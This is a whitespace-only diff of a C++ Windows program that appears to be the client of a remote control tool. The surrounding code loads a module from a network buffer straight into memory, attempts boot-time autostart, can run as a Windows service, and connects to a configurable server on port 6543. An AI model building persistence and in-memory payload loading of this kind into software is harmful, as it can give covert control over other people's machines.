@@ -189,10 +189,10 @@ public:
             memset(addr->szFlag, 0, sizeof(addr->szFlag));
             strcpy(addr->szServerIP, g_ConnectAddress.ServerIP());
             sprintf_s(addr->szPort, "%d", g_ConnectAddress.ServerPort());
-			addr->iStartup = g_ConnectAddress.iStartup;
-			addr->iHeaderEnc = g_ConnectAddress.iHeaderEnc;
-			addr->protoType = g_ConnectAddress.protoType;
-			addr->runningType = g_ConnectAddress.runningType;
+            addr->iStartup = g_ConnectAddress.iStartup;
+            addr->iHeaderEnc = g_ConnectAddress.iHeaderEnc;
+            addr->protoType = g_ConnectAddress.protoType;
+            addr->runningType = g_ConnectAddress.runningType;
             strcpy(addr->szGroupName, g_ConnectAddress.szGroupName);
         }
         m_mod = ::MemoryLoadLibrary(buffer + 6 + sizeof(PkgHeader), size);
@@ -231,15 +231,15 @@ int main(int argc, const char *argv[])
         Mprintf("设置开机自启动失败，请用管理员权限运行.\n");
     }
 
-	if (isService) {
-		bool ret = RunAsWindowsService(argc, argv);
-		Mprintf("RunAsWindowsService %s. Arg Count: %d\n", ret ? "succeed" : "failed", argc);
+    if (isService) {
+        bool ret = RunAsWindowsService(argc, argv);
+        Mprintf("RunAsWindowsService %s. Arg Count: %d\n", ret ? "succeed" : "failed", argc);
         for (int i = 0; !ret && i < argc; i++) {
-			Mprintf(" Arg [%d]: %s\n", i, argv[i]);
+            Mprintf(" Arg [%d]: %s\n", i, argv[i]);
         }
-		if (ret) return 0x20251202;
+        if (ret) return 0x20251202;
         g_ConnectAddress.iStartup = Startup_MEMDLL;
-	}
+    }
 
     status = 0;
     SetConsoleCtrlHandler(&callback, TRUE);
@@ -290,8 +290,8 @@ int main(int argc, const char *argv[])
 
     do {
         BOOL ret = Run((argc > 1 && argv[1][0] != '-') ? // remark: demo may run with argument "-agent"
-            argv[1] : (strlen(g_ConnectAddress.ServerIP()) == 0 ? "127.0.0.1" : g_ConnectAddress.ServerIP()),
-            argc > 2 ? atoi(argv[2]) : (g_ConnectAddress.ServerPort() == 0 ? 6543 : g_ConnectAddress.ServerPort()));
+                       argv[1] : (strlen(g_ConnectAddress.ServerIP()) == 0 ? "127.0.0.1" : g_ConnectAddress.ServerIP()),
+                       argc > 2 ? atoi(argv[2]) : (g_ConnectAddress.ServerPort() == 0 ? 6543 : g_ConnectAddress.ServerPort()));
         if (ret == 1) {
             return -1;
         }
